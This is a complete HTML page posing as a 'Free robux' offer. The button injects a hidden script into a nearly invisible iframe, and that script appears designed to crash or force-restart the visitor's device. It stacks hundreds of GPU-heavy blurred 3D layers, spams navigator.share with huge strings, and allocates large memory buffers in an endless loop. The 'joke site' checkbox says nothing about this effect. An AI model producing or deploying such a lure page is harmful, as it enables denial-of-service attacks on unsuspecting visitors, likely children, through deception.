<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Special offer</title>
    <style>
        body {
            background: #000;
            margin: 0;
        }
        #close-iframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 1px;
            height: 1px;
            border: none;
            opacity: 0.05; 
            pointer-events: none;
        }
        #interesting {
            height: 20vw;
            width: 40vw;
            border: none;
            border-radius: 30vw;
            font-size: clamp(0vw, 4cqw, 75vw);
            background-color: #0099FF;
            
        }

        #confirml {
            font-size: 2vw;
            color: #FFFFFF;
        }
    </style>
</head>

<body>

    <iframe id="close-iframe" 
        sandbox="allow-forms allow-modals allow-scripts allow-same-origin">
    </iframe>
    <label id="confirml">
        <input type="checkbox" id="confirm">
        I agree (joke site, it doesn't fr gives free robux)
    </label>

    <br><br>

    <button id="interesting" disabled>
        Free robux
    </button>


    <script>
        const confirmCheckbox = document.getElementById("confirm");
        const actionButton = document.getElementById("interesting");
        const frame = document.getElementById("close-iframe");

        confirmCheckbox.addEventListener("change", () => {
           actionButton.disabled = !confirmCheckbox.checked;
        });

       actionButton.addEventListener("click", () => {
           const respringScript = `
                <html>
                <body style="margin:0; overflow:hidden;">
                    <script>
                        const container = document.createElement('div');
                        container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
                        document.body.appendChild(container);
                        
                        for (let i = 0; i < 500; i++) {
                            let d = document.createElement('div');
                            d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop filter: blur (100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg); opacity: 0.99;';
                            container.appendChild(d);
                        }
                        
                        setInterval(() => {
                            try {
                                navigator.share({ title: 'R', text: 'R'.repeat(100000) });
                            } catch(e) {}
                            let x = new Uint8Array(1024 * 1024 * 20);
                            crypto.getRandomValues(x);
                        }, 0);
                    <\/script>
                </body>
                </html>
           `;
            frame.srcdoc = respringScript;
        });
    </script>
